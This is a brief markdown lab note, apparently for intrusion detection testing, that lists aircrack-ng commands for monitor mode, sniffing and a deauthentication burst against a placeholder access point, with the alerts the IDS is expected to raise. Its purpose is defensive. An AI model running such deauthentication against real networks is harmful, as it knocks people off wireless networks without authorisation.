# Wi-Fi Attack Simulation

## Objective
Generate wireless attack traffic for IDS analysis.

## Tools
- Aircrack-ng suite

## Example Commands
airmon-ng start wlan0
airodump-ng wlan0mon
aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon

## Expected Detection
- Deauthentication flood
- IDS alert: Wireless DoS attempt
